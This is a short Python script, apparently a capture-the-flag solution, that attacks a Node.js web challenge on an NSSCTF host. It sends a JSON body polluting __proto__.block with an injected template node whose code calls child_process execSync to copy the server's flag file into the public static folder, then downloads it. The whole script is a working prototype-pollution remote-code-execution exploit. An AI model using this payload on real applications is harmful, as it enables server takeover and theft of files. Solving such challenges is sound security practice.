import requests

TARGET_URL = 'http://node4.anna.nssctf.cn:20379/'

# 构造Payload，将flag写入网站的静态资源目录（如static）
payload = {
    "hero.name": "锐雯",
    "__proto__.block": {
        "type": "Text",
        # static没有在/var/www/html下,进虚拟终端看了一下是在app下
        "line": "process.mainModule.require('child_process').execSync('cat /flag* > /app/static/flag.txt')"
    }
}

try:
    resp1 = requests.post(TARGET_URL + '/api/submit', json=payload)
    print("污染请求状态码:", resp1.status_code)
    print("污染响应内容:", resp1.text)


    flag_file_url = TARGET_URL + '/static/flag.txt'
    resp2 = requests.get(flag_file_url)
    if resp2.status_code == 200:
        print("[成功] Flag是:", resp2.text)
    else:
        print("[?] 文件可能不存在，尝试其他路径或方法。")

except Exception as e:
    print("请求出错:", e)